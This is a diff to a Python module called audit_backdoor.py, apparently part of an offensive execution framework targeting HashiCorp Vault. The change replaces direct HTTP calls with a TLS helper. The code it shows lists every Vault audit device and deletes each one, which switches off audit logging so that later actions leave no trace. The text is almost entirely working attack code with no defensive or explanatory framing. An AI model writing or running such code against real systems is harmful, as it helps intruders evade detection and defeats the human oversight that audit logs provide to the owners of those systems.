@@ -1,6 +1,6 @@
 # active_execution/modules/audit_backdoor.py
 from typing import Optional, Dict, Any
-import requests
+from core.tls_config import vault_request
 from ..context import ExecutionContext
 from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel
 
@@ -23,7 +23,7 @@ class AuditBackdoorModule(BaseExecutionModule):
         try:
             # List audit devices
             url = f"{context.vault_addr}/v1/sys/audit"
-            resp = requests.get(url, headers=headers, timeout=10)
+            resp = vault_request("GET", url, headers=headers, timeout=10)
             if resp.status_code != 200:
                 return ExecutionResult(
                     status="failed",
@@ -34,7 +34,7 @@ class AuditBackdoorModule(BaseExecutionModule):
             disabled = []
             for name in audits:
                 disable_url = f"{context.vault_addr}/v1/sys/audit/{name}"
-                resp_del = requests.delete(disable_url, headers=headers, timeout=10)
+                resp_del = vault_request("DELETE", disable_url, headers=headers, timeout=10)
                 if resp_del.status_code in [200, 204]:
                     disabled.append(name)
             results["disabled"] = disabled
